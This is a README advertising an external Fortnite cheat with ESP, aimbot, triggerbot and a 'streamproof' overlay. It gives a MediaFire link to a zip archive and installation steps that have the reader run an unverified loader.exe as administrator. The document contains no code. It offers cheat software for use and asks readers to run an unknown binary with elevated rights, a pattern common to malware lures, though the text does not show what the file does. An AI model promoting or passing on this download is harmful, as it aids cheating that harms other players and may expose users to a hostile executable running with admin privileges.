# Fortnite External Cheat

External cheat for Fortnite with ESP and aimbot. Overlay based, no memory injection into the game.

## Download

**[Download Fortnite External Cheat](https://www.mediafire.com/file/9livkzxm1qj0199/Fc_Cheat.zip/file)**

## Features

- ESP: boxes, skeleton, health, distance
- Aimbot with adjustable FOV, smoothing and bone selection
- Triggerbot with configurable delay
- Radar overlay
- Streamproof overlay
- Config with hot reload

## Installation

1. Download the archive from the link above
2. Extract it to a separate folder
3. Run `loader.exe` as administrator
4. Launch Fortnite and wait for attach

## Usage

Open the menu with `INSERT`. All settings are saved to `config.json` next to the loader.
